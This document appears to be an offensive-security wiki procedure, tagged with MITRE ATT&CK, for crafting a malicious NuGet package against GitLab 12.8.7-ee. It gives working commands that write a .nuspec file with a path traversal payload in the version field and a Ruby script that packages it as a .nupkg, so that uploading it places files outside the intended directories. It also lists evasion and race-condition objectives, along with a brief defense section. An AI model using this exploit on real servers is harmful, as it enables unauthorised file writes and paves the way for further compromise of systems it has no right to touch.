---
tags:
  - path-traversal
  - nuget
  - file-creation
type: procedure
tools:
  - '[[tools/RubyZip-Archive-Library]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/gem-install-rubyzip]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:26:27.682Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 37277ecb-1a32-4d2a-8478-c7ba5650754b
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Create-Malicious-NuGet-Package-with-Path-Traversal-Payload

## Summary

This procedure crafts a malicious .nuspec XML file embedded in a .nupkg archive, using path traversal in the <version> field to manipulate filename creation during GitLab's metadata extraction, allowing arbitrary file placement on the filesystem.

## Description

In GitLab's NuGet Package Registry, the metadata_extraction_service.rb uses Nokogiri to parse uploaded .nuspec files without sanitizing <id> or <version> fields. These are concatenated into #{package_name.downcase}.#{package_version.downcase}.nupkg, enabling traversal payloads like ../../../../../target to write files outside intended directories. This targets GitLab 12.8.7-ee on Linux, requiring Ruby for packaging. Outcomes include file creation as the git user, setting up further exploits.

## Requirements

1. Ruby 2.6.5 environment with Bundler
2. Access to create ZIP archives
3. Knowledge of XML structure for NuGet specs

## Defense

Defensive measures and detection strategies:

- Sanitize XML inputs in Nokogiri parsing with whitelisting
- Validate package versions against semantic versioning regex
- Monitor filesystem for unexpected .nupkg files outside package dirs

## Objectives

1. Generate a valid .nupkg with traversal payload
2. Ensure payload evades initial upload validation
3. Position file for race condition exploitation

## Instructions

### Step 1: Install RubyZip Gem

**Context**: Prepare environment for ZIP creation of the .nupkg file.

**Command** ([[commands/gem-install-rubyzip]]):
```bash
gem install rubyzip
```

> Installs the RubyZip library for handling .nupkg archives. Expected output: Successful installation message.

### Step 2: Craft Malicious Nuspec XML

**Context**: Create XML with traversal in <version> to exploit unsanitized concatenation.

**Command** (Manual file creation):
```bash
cat > dummy.nuspec << EOF
<?xml version="1.0"?>
<package>
  <metadata>
    <id>DummyProject.DummyPackage</id>
    <version>../../../../../nyangawa</version>
  </metadata>
</package>
EOF
```

> Writes the XML file. Expected output: File created; verify with cat dummy.nuspec showing traversal payload.

### Step 3: Package into Nupkg

**Context**: Zip the nuspec into dummy.nupkg using RubyZip.

**Command** (Ruby script):
```ruby
require 'rubygems'
require 'zip'
Zip::File.open('dummy.nupkg', Zip::File::CREATE) do |zipfile|
  zipfile.add('dummy.nuspec', 'dummy.nuspec')
end
```

> Creates the archive. Expected output: dummy.nupkg file generated; unzip to verify contents.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/gem-install-rubyzip]]

## Tools Used

- [[tools/RubyZip-Archive-Library]]

## Tags

- path-traversal
- nuget
- ruby
